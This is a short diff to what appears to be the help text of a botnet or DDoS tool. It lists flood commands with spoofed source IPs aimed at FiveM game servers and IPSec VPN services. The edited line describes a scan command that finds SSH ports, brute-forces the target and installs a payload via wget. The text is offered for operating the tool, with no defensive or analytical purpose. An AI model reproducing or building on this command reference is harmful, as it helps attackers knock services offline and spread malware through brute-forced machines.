@@ -93,7 +93,7 @@ All of the attack vectors will be <strong>random source port automatically, min 
 		?fms 	 <srcIP> <dstIP>				Flood query payload to a FiveM game server(They use to host GTAV i guess. i'm only playing "Hell let loose" for now, lol).
 		?ipsec 	 <srcIP> <dstIP>				Flood payload to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
 	
-	?scan 	 <modes> <ftp>				Scan SSH port on the network, Brute-Force attack to the target and load the payload by "wget".
+	?scan 	 <modes> <ftp>				Scan SSH port on the network, Brute-Force attack to the target and install the payload by "wget".
 	
 	Scanner modes:
 	
